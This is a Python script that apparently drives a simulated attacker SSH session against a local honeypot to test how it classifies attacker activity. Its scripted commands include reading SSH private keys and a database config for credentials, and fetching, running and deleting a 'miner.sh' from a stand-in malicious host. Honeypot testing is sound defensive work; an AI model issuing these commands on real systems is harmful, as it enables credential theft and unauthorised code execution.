import time
import socket
import threading
import paramiko

def run_simulation(host="127.0.0.1", port=2222, username="admin", password="password123"):
    """
    Simulates a sequence of attacker activities connecting to the decoy honeypot.
    """
    time.sleep(2)  # Wait for server to bind/spin up fully
    print(f"[*] Attacker Simulator: Starting connection to {host}:{port} as user '{username}'...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Connect and authenticate
        ssh.connect(host, port=port, username=username, password=password, timeout=10)
        print("[+] Attacker Simulator: Successfully logged in. Initiating commands sequence...")
        
        channel = ssh.invoke_shell()
        time.sleep(1)
        
        # Helper to send a command and wait briefly for response echo
        def send_cmd(cmd):
            print(f"[>] Simulator Sending: {cmd}")
            channel.send(cmd + "\n")
            time.sleep(1.5)
            
        send_cmd("whoami")
        send_cmd("id")
        send_cmd("uname -a")
        send_cmd("pwd")
        send_cmd("ls -la")
        send_cmd("cd .ssh")
        send_cmd("ls -la")
        send_cmd("cat id_rsa")  # Triggers Credential Access mapping
        send_cmd("cd /var/www/html/config")
        send_cmd("cat database.yml")  # Triggers Credential Access mapping
        send_cmd("cd /home/admin")
        send_cmd("cat todo.txt")
        send_cmd("curl -O http://malicious-command.com/miner.sh")  # Simulated tool ingress
        send_cmd("chmod +x miner.sh")
        send_cmd("./miner.sh")
        send_cmd("rm -rf miner.sh")
        send_cmd("exit")
        
        ssh.close()
        print("[+] Attacker Simulator: Connection completed successfully.")
    except Exception as e:
        print(f"[-] Attacker Simulator Connection failed: {e}")

def trigger_bg_simulation():
    t = threading.Thread(target=run_simulation, daemon=True)
    t.start()
